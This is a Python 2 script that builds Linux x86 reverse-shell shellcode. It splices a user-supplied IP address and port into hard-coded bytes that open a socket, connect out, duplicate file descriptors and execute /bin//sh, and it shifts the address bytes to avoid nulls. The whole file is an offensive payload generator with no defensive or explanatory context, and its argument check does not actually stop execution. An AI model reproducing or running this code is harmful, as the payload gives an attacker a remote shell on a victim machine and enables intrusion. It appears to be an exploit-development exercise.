#!/usr/bin/python

import socket
import sys
import binascii

shell1 = ""
shell1 += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80"
shell1 += "\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x31\\xc9\\x51\\xb9"
shell2 = ""
shell2 += "\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
shell3 = ""
shell3 += "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10"
shell3 += "\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb1\\x03\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80"
shell3 += "\\x75\\xf6\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50"
shell3 += "\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 3:
	print 'Usage: wrapper.py <host IP> <port>'
	exit

ip = sys.argv[1]

ip = ip.split('.')

ip1 = int(ip[0]) + 1
ip2 = int(ip[1]) + 1
ip3 = int(ip[2]) + 1
ip4 = int(ip[3]) + 1

newip = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)

newHex = binascii.hexlify(socket.inet_aton(newip))

newHex = "\\x" + str(newHex)[0:2] + "\\x" + str(newHex)[2:4] + "\\x" + str(newHex)[4:6] + "\\x" + str(newHex)[6:8]

portNumber = sys.argv[2]
portNumber = int(portNumber)
portNumber = socket.htons(portNumber)
portNumber = hex(portNumber)

portNum1 = portNumber[2:4]
portNum2 = portNumber[4:6]

portNum1 = str(portNum1)
portNum1 = "\\x" + portNum1

portNum2 = str(portNum2)
portNum2 = "\\x" + portNum2

combined = portNum2 + portNum1

shell = shell1 + newHex + shell2 + combined + shell3

		
print shell
